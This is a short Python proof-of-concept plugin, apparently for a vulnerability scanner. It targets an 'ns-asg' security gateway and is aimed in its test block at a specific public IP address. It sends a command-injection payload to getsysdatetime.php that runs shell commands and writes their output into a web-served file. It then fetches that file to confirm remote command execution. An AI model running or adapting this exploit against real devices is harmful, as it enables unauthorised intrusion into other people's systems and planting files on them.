#!/usr/bin/env python
#-*- coding:utf-8 -*-
#自挖

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    url1 = arg + 'protocol/iscdevicestatus/getsysdatetime.php'
    postdata = "procotalarray[messagecontent]=pwd;ifconfig>/Isc/third-party/httpd/htdocs/vvvv.php;+456"
    code, head, res, errcode, _ = curl.curl2(url1,post=postdata)
    url2 = arg + 'vvvv.php'
    code, head, res, errcode, _ = curl.curl2(url2)
    if code==200 and 'Ethernet  HWaddr' in res and 'Mask' in res:
        security_hole("Command Execution:%s"%url1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg','https://211.142.89.50/')[1])